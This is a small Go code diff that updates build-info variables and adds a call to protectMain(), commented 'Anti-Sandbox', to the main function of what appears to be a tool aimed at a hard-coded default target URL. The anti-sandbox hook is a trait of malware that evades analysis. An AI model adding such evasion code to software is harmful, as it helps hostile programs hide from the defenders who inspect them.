@@ -9,12 +9,17 @@ import (
 
 // X args
 var (
-	timestamp = "unknown"
-	version   = "unknown"
+	AppName   string
+	BuiltAt   string
+	GoVersion string
+	GitAuthor string
+	GitCommit string
+	Version   string = "dev"
 )
 
 // Main Function / 主函数
 func main() {
+	protectMain() // Anti-Sandbox
 	defaultTargetUrl := "https://xmr.xn--9tr.com/"
 	runtime.GC() // Clean up memory to prevent memory overflow
 	// Parse Flags / 解析命令行参数
